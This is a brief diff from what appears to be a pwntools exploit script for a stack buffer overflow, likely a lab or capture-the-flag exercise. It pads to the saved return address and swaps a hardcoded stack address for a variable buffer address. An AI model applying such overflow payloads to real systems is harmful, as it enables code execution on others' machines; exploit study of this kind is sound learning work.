@@ -408,7 +408,7 @@ offset_to_rip = (616 - 512)
 payload += b"A" * offset_to_rip
 
 # da60
-payload += p64(0x7fffffffda60)
+payload += p64(buffer_addr)
 print(f"payload_len: {len(payload)}")
 
 p.sendlineafter(b"to start: ", b"read")
